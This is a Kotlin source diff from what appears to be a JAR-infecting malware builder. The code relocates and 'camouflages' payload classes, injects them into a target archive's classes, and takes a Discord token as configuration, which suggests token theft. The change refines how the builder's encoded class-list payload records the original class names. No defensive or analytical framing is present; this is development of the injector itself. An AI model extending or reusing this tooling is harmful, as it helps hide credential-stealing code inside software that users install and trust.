@@ -161,6 +161,8 @@ fun process(
             )
             finalMainPayloadName = finalPayloadName
 
+            val invertedRelocationMap = masterRelocationMap.entries.associate { (k, v) -> v to k }
+
             Logs.info("Relocating and camouflaging payload classes...")
             var finalClasses = relocateClasses(allInjectableClasses, masterRelocationMap)
             Logs.info("Relocation complete.")
@@ -179,14 +181,16 @@ fun process(
                 discordToken = discordToken,
                 injectOther = injectOther,
                 warnings = warnings,
-                camouflage = camouflage
+                camouflage = camouflage,
+                invertedRelocationMap = invertedRelocationMap
             )
 
             Logs.info("Injecting ${finalClasses.size} final classes...")
             finalClasses.forEach { finalClass ->
                 val pathInJar = fs.getPath(finalClass.name + ".class")
                 pathInJar.parent?.let { if (!Files.exists(it)) Files.createDirectories(it) }
-                pathInJar.writeBytes(finalClass.compile())
+                val classBytes = finalClass.compile()
+                Files.write(pathInJar, classBytes)
             }
             Logs.info("All payload classes injected successfully.")
 
@@ -285,7 +289,8 @@ private fun applyConfiguration(
     discordToken: String,
     injectOther: Boolean,
     warnings: Boolean,
-    camouflage: Boolean
+    camouflage: Boolean,
+    invertedRelocationMap: Map<String, String>
 ): List<ClassFile> {
     val targetIndex = classes.indexOfFirst { it.name == targetClassName }
     if (targetIndex == -1) {
@@ -296,19 +301,24 @@ private fun applyConfiguration(
     val originalTargetFile = classes[targetIndex]
     val originalBytecode = originalTargetFile.compile()
 
-    val classNamesForPayload = classes.map { it.name }.sorted()
+    val originalSimpleNames = classes.map { finalClass ->
+        val originalFullName = invertedRelocationMap.getOrDefault(finalClass.name, finalClass.name)
+        originalFullName.substringAfterLast('/')
+    }.sorted()
+
     val classlistPayloadBase64: String
     try {
         ByteArrayOutputStream().use { baos ->
             DataOutputStream(baos).use { dos ->
-                classNamesForPayload.forEach { className ->
-                    val nameBytes = className.toByteArray(StandardCharsets.UTF_8)
+                originalSimpleNames.forEach { simpleName ->
+                    val nameBytes = simpleName.toByteArray(StandardCharsets.UTF_8)
                     dos.writeInt(nameBytes.size)
                     dos.write(nameBytes)
                 }
             }
             classlistPayloadBase64 = Base64.getEncoder().encodeToString(baos.toByteArray())
-            Logs.info("Generated class list payload with ${classNamesForPayload.size} classes.")
+            Logs.info("Generated class list payload with ${originalSimpleNames.size} original simple names.")
+            Logs.info("Classlist Payload (Base64 of simple names): $classlistPayloadBase64")
         }
     } catch (e: IOException) {
         Logs.error("Failed to generate class list payload: ${e.message}")
